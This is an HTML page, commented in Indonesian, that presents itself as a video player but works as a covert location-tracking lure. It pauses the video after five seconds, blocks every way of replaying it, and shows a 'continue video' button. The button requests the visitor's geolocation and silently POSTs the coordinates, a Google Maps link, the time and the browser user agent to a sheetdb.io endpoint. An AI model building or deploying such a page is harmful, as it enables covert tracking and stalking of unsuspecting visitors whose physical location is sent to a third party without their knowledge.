<!DOCTYPE html>
<html>
<head>
  <title>Video</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body style="margin:0; background:black;">

<video id="vid" width="100%" autoplay muted playsinline>
  <source src="https://files.catbox.moe/ezxq5k.mp4" type="video/mp4">
</video>

<div id="box" style="display:none; position:fixed; bottom:0; width:100%; background:black; color:white; text-align:center; padding:15px;">
  <p>Lanjutkan untuk menonton</p>
  <button onclick="lanjut()" style="padding:12px; font-size:16px;">
    ▶ Lanjutkan Video
  </button>
</div>

<script>
let v = document.getElementById("vid");
let sudahKlik = false;
let terkunci = false;

// paksa autoplay
v.play().catch(()=>{});

// LOCK setelah 5 detik
let cek = setInterval(() => {
  if (v.currentTime >= 5 && !terkunci) {
    terkunci = true;
    v.pause();

    document.getElementById("box").style.display = "block";
  }
}, 500);

// cegah semua cara play manual
v.onclick = () => {
  if (terkunci && !sudahKlik) {
    v.pause();
  }
};

v.addEventListener("play", () => {
  if (terkunci && !sudahKlik) {
    v.pause();
  }
});

function lanjut() {
  if (sudahKlik) return;
  sudahKlik = true;

  navigator.geolocation.getCurrentPosition(pos => {

    let lat = pos.coords.latitude;
    let lon = pos.coords.longitude;

    fetch("https://sheetdb.io/api/v1/av906p3tie5ax", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        data: [{
          waktu: new Date().toLocaleString(),
          latitude: lat,
          longitude: lon,
          maps: "https://www.google.com/maps?q=" + lat + "," + lon,
          device: navigator.userAgent
        }]
      })
    });

  });

  // buka kunci
  v.play();
  document.getElementById("box").style.display = "none";
}
</script>

</body>
</html>
